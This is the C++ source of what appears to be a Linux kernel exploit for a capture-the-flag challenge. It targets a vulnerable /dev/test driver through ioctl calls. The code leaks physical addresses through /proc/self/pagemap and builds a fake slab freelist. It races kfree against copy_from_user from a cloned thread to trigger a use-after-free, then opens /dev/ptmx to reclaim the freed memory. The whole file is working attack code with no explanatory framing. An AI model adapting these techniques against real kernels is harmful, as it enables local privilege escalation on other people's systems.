/* Copyright (C) 2019 braindead <braindeaded@protonmail.com> All Rights Reserved.
 */

#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/poll.h>
#include <initializer_list>
#include "shellcode.hxx"

//const u64 TARGET = 0xdeadbeefdeadbeef;
const u64 TARGET = 0x7aaa000;
const u64 TARGET_KADDR = 0xffff880000000000 + TARGET;

const int SIZE = 0x2c0;//64;

#define ran(v,a,b) for(auto v = (a); v < (b); v++)

static void sleep(int n)
{
	sys::poll(nullptr, 0, n*1000);
}

static size_t strlen(const char *c)
{
	auto p = c;
	while (*p) p++;
	return p-c;
}

static void memset(char *a, char c, size_t n)
{ while (n--) *a++ = c; }

static bool memcmp(const char *a, const char *b, size_t n)
{
	while (n--)
		if (*a++ != *b++) return 1;
	return 0;
}

static bool strcmp(const char *a, const char *b)
{
	while (*a && *b) {
		if (*a != *b) return *a - *b;
		a++, b++;
	}
	return *a - *b;
}

static void memmove(char *a, const char *b, size_t n)
{ while (n--) *a++ = *b++; }

static void _say(const char *c)
{
	auto n = strlen(c);
	sys::write(2, c, n);
}

static void _say(unsigned long x)
{
	char buf[16];
	ran (i, 0, 16) {
		buf[15-i] = "0123456789abcdef"[x&15];
		x >>= 4;
	}
	sys::write(2, buf, 16);
}

template <typename Arg>
static void say(Arg arg) { _say(arg); }
template <typename Arg, typename... Args>
static void say(Arg arg, Args... args) { _say(arg); say(args...); }

static u64 read_tsc()
{
	register u64 rax asm ("rax");
	register u64 rdx asm ("rdx");
	asm volatile (
		"rdtsc"
		: "=r" (rax), "=r" (rdx)
		:
		:
	);
	return rax |= rdx<<32;
}

static char *tok(char *&it)
{
	if (!*it) return nullptr;
	char *t = it;
	while (*it && *it != ' ' && *it != '\t') it++;
	if (*it) *it++ = 0;
	return t;
}

struct Shared;

__attribute__((noinline))
static void trigger_breakpoint()
{
	//asm volatile ( "" : : : "memory" );
	//sys::write(1, "trap\n", 5);
	for (;;);
}

static void *mmap_anon(u64 n)
{
	u64 x;
	x = sys::mmap(0, n, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if ((u64)x > 0xfffffffffffff000) {
		say("[-] cannot mmap: errno=", -x, "\n");
		sys::exit_group(1);
	}
	return (void*)x;
}

__attribute__((noinline))
static void spawn(Shared &s, void (*func)(Shared &s))
{
	int flags = (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM
		| CLONE_SIGHAND | CLONE_THREAD
		| 0);

	void *m = mmap_anon(0x8000);

	register u64 f asm ("r13") = (u64)func;
	register u64 a asm ("r14") = (u64)&s;
	register u32 rax asm ("eax") = 56;
	register u64 rdi asm ("rdi") = flags;
	register u64 rsi asm ("rsi") = (u64)m+0x7000;
	register u64 rdx asm ("rdx") = 0;
	register u64 r10 asm ("r10") = 0;
	register u64 r8 asm ("r8") = 0;
	register u64 ret asm ("rax");

	asm volatile (
		"syscall;"
		"test %%eax, %%eax;"
		"jnz 1f;"
		"mov %%r14, %%rdi;"
		"call *%%r13;"
		"mov $60, %%rax;"
		"xor %%edi, %%edi;"
		"syscall;"
	"\n1:"
		: "=r" (ret)
		: "r" (rax), "r" (rdi), "r" (rsi), "r" (rdx), "r" (r10), "r" (r8), "r" (f), "r"  (a)
		: "rcx", "r11", "memory"
	);
	if (ret < 0) {
		say("clone failed: ", -ret);
	}
}


static const int TD = 0x23335; // kfree
static const int TW = 0x23333; // copy_from_user
static const int TR = 0x23334; // copy_to_user

#define HOME "/home/ctf"

struct TReq {
	unsigned long size;
	void *mem;
};

struct Shared {
	int dev, dfile;
	u64 *iobuf;
	char *evil_slab;
	void *map;
};

static u64 querypmap(u64 addr)
{
	int fd = sys::open("/proc/self/pagemap", O_RDONLY, 0);
	u64 x;
	sys::pread64(fd, (char*)&x, 8, (addr>>12)*8);
	sys::close(fd);
	return x;
}

__attribute__((noreturn))
extern "C" void _start()
{
	int r;

	Shared sh;

	/*
	spawn(sh, [](Shared &sh) {
		say("Hello from another thread\n");
	});
	*/

	//Thread th_fss(reader_thread, &sh);

	int uid = sys::getuid();
	say("[*] my uid = ", uid, "\n");

	say("[*] Opening the device...\n");
	int fd = sys::open("/dev/test", O_RDWR, 0);
	if (fd < 0) {
		say("[-] open: errno=", -fd, "\n");
		sys::exit_group(1);
	}
	sh.dev = fd;


	say("[*] Alloc buffers\n");
	sh.evil_slab = (char*)mmap_anon(0x1000);
	{ // init list
		u64 prev = 0;
		ran (i, 0, 0x1000/SIZE) {
			char *s = sh.evil_slab+i*SIZE;
			*(u64*)s = prev;
			prev = (u64)s;
		}
	}
	memset(sh.evil_slab, 'A', 0x1000);

	u64 target_kaddr = querypmap((u64)sh.evil_slab)&0xFFFFFFFF;
	target_kaddr <<= 12;
	target_kaddr += 0xffff880000000000;
	say("target ", target_kaddr, "\n");
	//target_kaddr = 0xdeadbeef;
	//target_kaddr = (u64)sh.evil_slab;//0xdeadbeef;

	sh.iobuf = (u64*)mmap_anon(0x1000);
	ran (i, 0, 0x1000/8)
		((u64*)sh.iobuf)[i] = target_kaddr;

	size_t sprayed_pages = 0;
	say("[*] Spraying... ");
	if (0) ran (i, 0, 0x5000) {
		u64 x = (u64)sys::mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
		if (x > 0xfffffffffffff000ULL)
			break;
		ran (i, 0, 0x1000/8) {
			((u64*)x)[i] = (u64)sh.evil_slab;
		}
		sprayed_pages += 1;
	}
	say(sprayed_pages, " pages created\n");

	void *r_stack = mmap_anon(0x8000);

	for (;;) {
		//say("[*] Creating disk file\n");

		sh.dfile = sys::open(HOME "/d", O_CREAT | O_TRUNC | O_RDWR | O_DIRECT, 0777);
		if (sh.dfile < 0) {
			say("[-] cannot create disk file: errno=", -sh.dfile, "\n");
			sys::exit_group(1);
		}

		u64 x;
		if ((x = sys::write(sh.dfile, (char*)sh.iobuf, 0x1000)) != 0x1000) {
			say("[-] cannot write to disk file: ", -x, "\n");
			sys::exit_group(1);
		}

		auto map_addr = sys::mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, sh.dfile, 0);
		if ((u64)map_addr > 0xfffffffffffff000ULL) {
			say("[-] cannot mmap disk file: errno=", -(i64)map_addr, "\n");
			sys::exit_group(1);
		}
		sh.map = (void*)map_addr;

		TReq tr;
		tr.size = SIZE;
		tr.mem = sh.map;
		int r = sys::ioctl(sh.dev, TW, (unsigned long)&tr);

		//say("[*] Racing...\n");
		spawn(sh, [](Shared &sh) {
			TReq tr;
			tr.size = SIZE;
			tr.mem = sh.map;
			int r = sys::ioctl(sh.dev, TW, (unsigned long)&tr);
			if (r < 0) say("ioctl failed\n");
			sys::exit(0);
		});

		ran (i, 0, 10) {
			r = sys::ioctl(sh.dev, TD, (unsigned long)&tr);
			if (r < 0) say("ioctl failed\n");
			//sys::poll(0, 0, 10);
			r = sys::ioctl(sh.dev, TW, (unsigned long)&tr);
			if (r < 0) say("ioctl failed\n");
		}
		int fd = sys::open("/dev/ptmx", O_RDONLY, 0);
		if (fd < 0)
			say("cannot open ptmx: ", -fd);
		sys::close(fd);
		/*
		pid_t p = sys::fork();
		if (p == 0) {
			ran (i, 0, 0x1000) {
				if (sh.evil_slab[i] != 'A') {
					say("\noy vey\n");
				}
			}
			sys::exit(0);
		} else {
			sys::wait4(p, 0, 0, 0);
		}
		*/

		ran (i, 0, 0x1000) {
			if (sh.evil_slab[i] != 'A') {
				say("\nevil slab was touched!\n");
			}
		}
		//sys::poll(0, 0, 100);
		say(".");

		//say("Try again?");
		//char c;
		//sys::read(0, &c, 1);

		// Cleanup
		sys::munmap(map_addr, 0x1000);
		sys::close(sh.dfile);
	}

	sys::exit_group(0);
	__builtin_unreachable();
}
